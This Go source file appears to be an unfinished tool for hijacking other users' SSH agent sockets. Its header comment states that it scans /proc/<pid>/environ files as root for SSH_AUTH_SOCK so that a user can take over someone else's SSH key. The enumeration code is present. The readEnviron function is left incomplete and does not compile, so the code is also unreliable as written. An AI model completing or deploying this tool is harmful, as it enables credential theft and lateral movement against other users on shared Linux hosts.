package main

// this package will consistently check /proc/#### directories
// for the environ file. When it finds a new one, it checks to
// see if the SSH_AUTH_SOCK variable is set, and if it is it will
// dump it to the screen. This will allow a user to hijack an SSH
// key as long as that user is still in the system.

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

const ENVIRON string = "environ"

func main() {
	// first and foremost, let's confirm that we're root.
	if !areWeRoot() {
		fmt.Println("You must be root to run this application. Quitting...")
		return
	}
	s, err := findEnviron("/proc")
	if err != nil {
		panic(err)
	}
	fmt.Println("S:", s)
	for idx, i := range s {
		fmt.Println("Got:", idx, i)
	}
}

func readEnviron(loc string) bool {
	// this will read the environment file and
	// return True if the SSH_AUTH_SOCK variable exists
	
	e, err := ioutil.ReadAll()
}

func areWeRoot() bool {
	user, err := user.Current()
	if err != nil {
		log.Fatalln("Could not get current user!")
	}
	thisUID, err := strconv.Atoi(user.Uid)
	if err != nil {
		return false //wha?
	}
	if thisUID == 0 {
		// we are root
		return true
	}
	return false
}

func findEnviron(startPath string) ([]string, error) {
	if !strings.HasSuffix(startPath, "/") {
		startPath += "/"
	}
	var pidSlice []string
	var validEnviron []string
	files, err := ioutil.ReadDir(startPath)
	if err != nil {
		// file read error
		return validEnviron, err
	}
	// if this isn't catching anything, drop the /
	rex, err := regexp.Compile(startPath + `\d+`)
	if err != nil {
		// regex error for some reason
		return validEnviron, err
	}
	for _, file := range files {
		fullPath := startPath + file.Name()
		if rex.MatchString(fullPath) {
			pidSlice = append(pidSlice, fullPath)
		}
	}

	for _, pid := range pidSlice {
		// sometimes go is just weird man
		if _, err := os.Stat(pid + "/" + ENVIRON); !os.IsNotExist(err) {
			validEnviron = append(validEnviron, pid + "/" + ENVIRON)
		}
	}
	return validEnviron, err
}

func old_and_busted_findEnviron(startPath string) ([]string, error) {
	// This function will return a slice of strings pointing
	// to the location of an environ file. This will be split
	// to a workqueue later.
	if !strings.HasSuffix(startPath, "/") {
		startPath += "/"
	}
	// just making sure we end with a /
	rex, err := regexp.Compile(startPath + `\d+/environ`)

	// create the slice to append to
	var enviroSlice []string

	if err := filepath.Walk(startPath, func(path string, info os.FileInfo, err error) error {
		fmt.Println("On:", path)
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		if rex.MatchString(path) {
			enviroSlice = append(enviroSlice, path)
		}
		return nil
	}); err != nil {
		log.Println("Could not read path!")
		log.Println(err)
		return enviroSlice, err
	}
	return enviroSlice, err
}
